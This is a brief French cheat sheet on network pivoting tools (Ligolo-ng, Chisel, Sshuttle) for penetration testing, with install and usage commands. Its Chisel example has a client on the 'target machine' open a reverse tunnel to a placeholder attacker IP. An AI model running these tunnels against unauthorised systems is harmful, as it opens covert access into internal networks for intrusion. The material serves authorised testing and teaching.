Outils de Pivoting

Ligolo-ng

Outil de pivoting moderne pour le tunneling.

Installation Agent

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_linux_amd64.tar.gz

Configuration du Proxy

sudo ip tuntap add user $(whoami) mode tun ligolo sudo ip link set ligolo up sudo ip route add [RÉSEAU_CIBLE] dev ligolo

Chisel

Outil de tunneling TCP/UDP sur HTTP.

Installation

wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz

Utilisation

# Sur la machine attaquante (serveur) ./chisel server -p 8080 --reverse # Sur la machine cible (client) ./chisel client [IP_ATTAQUANT]:8080 R:8001:127.0.0.1:8001

Sshuttle

VPN transparent via SSH.

Installation

apt-get install sshuttle

Utilisation

sshuttle -r user@target_host 0.0.0.0/0 -x target_host
